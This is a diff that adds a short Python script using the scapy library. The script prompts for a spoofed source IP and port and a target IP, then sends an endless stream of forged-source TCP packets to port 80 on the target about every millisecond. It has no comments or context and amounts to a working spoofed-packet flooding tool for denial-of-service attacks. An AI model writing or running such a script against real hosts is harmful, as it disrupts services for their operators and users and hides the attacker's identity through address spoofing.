@@ -1,0 +1,18 @@
+#!/usr/bin/python3
+
+from scapy.all import *
+
+src = input("Enter the spoofed source IP: ")
+srcport = int(input("Enter the spoofed source port: "))
+
+target = input("Enter the target IP: ")
+
+i=1
+
+while True: 
+  IP1 = IP(src=src, dst=target)
+  TCP1 = TCP(sport=srcport, dport=80)
+  pkt = IP1 / TCP1
+  send(pkt,inter= 0.001)
+  print("packet sent ", i)
+  i=i+1
